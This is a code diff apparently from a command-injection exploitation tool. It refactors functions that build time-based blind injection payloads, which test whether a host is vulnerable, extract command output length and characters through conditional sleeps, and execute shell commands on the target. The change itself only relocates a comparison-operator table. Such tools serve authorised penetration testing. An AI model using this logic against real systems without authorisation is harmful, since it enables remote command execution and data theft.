@@ -38,14 +38,11 @@ def _conditional_sleep(condition, timesec, separator):
   # Whole seconds: the delay is counted in them, and a fractional one only reads as noise.
   return settings.EVAL_GRAMMAR.delay(int(timesec), condition) + _end(separator)
 
-# The shell's comparison operators, as the languages being evaluated spell them.
-COMPARISON = {"-le": "<=", "-ge": ">=", "-lt": "<", "-gt": ">", "-eq": "==", "-ne": "!="}
-
 """
 Time-based decision payload (check if host is vulnerable).
 """
 def decision(separator, TAG, output_length, timesec, http_request_method):
-  condition = str(output_length) + "==" + settings.EVAL_GRAMMAR.length(_output("echo " + TAG))
+  condition = str(output_length) + settings.EVAL_GRAMMAR.COMPARISON["-eq"] + settings.EVAL_GRAMMAR.length(_output("echo " + TAG))
   return _conditional_sleep(condition, timesec, separator)
 
 """
@@ -59,7 +56,7 @@ Delay while a condition of the caller's own holds.
 """
 def condition_check(separator, condition, timesec, http_request_method):
   # Stated in the shell's spelling, as every other technique states it, so it is rewritten first.
-  for shell_operator, operator in COMPARISON.items():
+  for shell_operator, operator in settings.EVAL_GRAMMAR.COMPARISON.items():
     condition = condition.replace(settings.SINGLE_WHITESPACE + shell_operator + settings.SINGLE_WHITESPACE, operator)
   return _conditional_sleep(condition, timesec, separator)
 
@@ -68,7 +65,7 @@ Get the execution output length, of shell execution.
 """
 def get_length(separator, cmd, candidate_length, timesec, http_request_method):
   settings.USER_APPLIED_CMD = cmd
-  condition = str(candidate_length) + "<=" + settings.EVAL_GRAMMAR.length(_output(cmd))
+  condition = str(candidate_length) + settings.EVAL_GRAMMAR.COMPARISON["-le"] + settings.EVAL_GRAMMAR.length(_output(cmd))
   return _conditional_sleep(condition, timesec, separator)
 
 """
@@ -84,7 +81,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
   # The guess stays left of the operator, as it does elsewhere: the search reads the answer as "the
   # byte is at or above this", and an operand order of its own would send it into the wrong half.
   ordinal = settings.EVAL_GRAMMAR.ordinal(_output(cmd), num_of_chars - 1)
-  return _conditional_sleep(str(ascii_char) + COMPARISON.get(operator, "<=") + ordinal, timesec, separator)
+  return _conditional_sleep(str(ascii_char) + settings.EVAL_GRAMMAR.COMPARISON[operator] + ordinal, timesec, separator)
 
 """
 __Warning__: The alternative shells are still experimental.
@@ -97,7 +94,7 @@ Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
   settings.USER_APPLIED_CMD = cmd
-  condition = str(output_length) + "<=" + settings.EVAL_GRAMMAR.length(_output(cmd))
+  condition = str(output_length) + settings.EVAL_GRAMMAR.COMPARISON["-le"] + settings.EVAL_GRAMMAR.length(_output(cmd))
   return _conditional_sleep(condition, timesec, separator)
 
 """
@@ -114,7 +111,7 @@ it could have produced - so what is compared is the output read as a number, not
 byte of it. Asked the other way, the digit '5' answers 53 and no candidate ever matches.
 """
 def fp_result_alter_interpreter(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
-  condition = str(ascii_char) + "==" + settings.EVAL_GRAMMAR.to_number(_output(cmd))
+  condition = str(ascii_char) + settings.EVAL_GRAMMAR.COMPARISON["-eq"] + settings.EVAL_GRAMMAR.to_number(_output(cmd))
   return _conditional_sleep(condition, timesec, separator)
 
 # eof
